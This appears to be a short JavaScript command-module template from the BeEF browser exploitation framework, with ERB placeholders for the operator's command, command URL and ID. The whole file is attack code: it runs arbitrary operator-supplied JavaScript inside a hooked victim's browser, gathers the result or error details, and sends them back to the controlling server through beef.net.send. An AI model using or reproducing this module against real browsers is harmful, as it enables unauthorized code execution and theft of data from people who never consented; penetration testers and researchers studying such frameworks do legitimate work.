beef.execute(function() {
	var result; 

	try { 
		result = function() {<%= @cmd %>}(); 
	} catch(e) { 
		for(var n in e) 
			result+= n + " " + e[n] + "\n"; 
	} 
	
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+escape(result));
});





 
